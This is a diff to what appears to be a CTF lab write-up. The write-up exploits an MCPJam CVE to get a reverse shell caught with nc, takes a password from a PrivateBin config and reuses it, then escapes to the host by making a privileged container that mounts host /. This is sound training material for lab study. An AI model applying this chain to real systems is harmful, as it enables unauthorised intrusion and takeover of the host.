@@ -83,7 +83,7 @@ ________________________________________________
 mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 431ms]
 bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 210ms]
 ```
-add these 2 to hosts 
+add these 2 to hosts.
 ```
 bin. is PrivateBin 2.0.2   donot find vuln.
 mcp MCPJam Version: v1.4.2. with  a vuln     CVE-2026-23520 
@@ -98,7 +98,7 @@ for mcp dimain, https://github.com/cypher-21/CVE-2026-23520/blob/main/exploit.py
 [*] This is expected if the payload is executing.
 [*] Check your listener.
 ```
-`➜  Downloads nc -nvlp 8821   `
+set a nc listener: `➜  Downloads nc -nvlp 8821   `
 ```
 Listening on 0.0.0.0 8821
 Connection received on 10.129.120.205 43148
@@ -182,7 +182,6 @@ drwxr-xr-x    1 root     root          4096 Mar 15 21:23 ..
 ```
 It obviously inside contrainer, run linpeas.
 ```
-from linpeas
 ╔══════════╣ Readable files belonging to root and readable by me but not world readable
 -rwxr-x---    1 root     www-data     25888 Mar  4 12:49 /srv/cfg/conf.php
 
@@ -197,14 +196,16 @@ usr = "privatebin"
 pwd = "ComplexP@sswordAdmin1928"
 ```
 got a Credential, since port 3552 is not involved. 
-use arcane / ComplexP@sswordAdmin1928  for port 3552. this is a guess!!
+use arcane / ComplexP@sswordAdmin1928  for port 3552 login. this is a guess!!
 Arcane is used to mange container.
+```
 as ctr is avalablie in the host , https://hacktricks.wiki/en/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.html
 in the management page, we create new container use the same image used by crrent running container. and set folder / of mother machine to /app (or any folder you like), to map / to /app inthe container  and enable privi mode.
+```
 `privatebin/nginx-fpm-alpine:2.0.2` this is the image used
 
-after create Imag, in the contrainer pageXOffset, launch a SVGFEMorphologyElement, view /app folder that is / of target host .
-
+after create, in the contrainer page,set the config as, view /app folder that is / of target host . lauch a shell on the web page
+```
 /var/www # cd /app
 /app # ls
 app              home             opt              snap
@@ -217,3 +218,8 @@ etc              mnt              sbin             var
 /app/root # ls
 arcane_linux_amd64  data                root.txt
 /app/root # cat root.txt
+```
+
+#### lesson learned
+- we may meet some rabbithole, so enum all the info we can. subdomain, services, dir... and try all the potential vuln as we can. It may be useful in the later part inthis pentest.
+- contrainer escape and mount mother host folder when create container.
